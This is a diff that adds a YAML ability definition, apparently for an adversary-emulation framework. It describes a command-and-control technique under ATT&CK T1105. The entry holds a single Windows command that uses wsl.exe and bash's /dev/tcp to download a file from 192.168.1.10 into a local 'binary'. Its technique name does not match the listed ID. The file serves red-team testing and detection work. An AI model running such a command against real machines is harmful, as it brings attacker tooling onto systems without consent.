@@ -1,0 +1,21 @@
+- id: e7f4cd9b-ca7a-e03d-6680-4a8503954916
+  name: Wsl.exe - Downloads file from 192.168.1.10
+  description: Downloads file from 192.168.1.10
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Matthew Brown
+  created: '2019-06-27'
+  modified: '2019-06-27'
+  operating_system: Windows All Versions
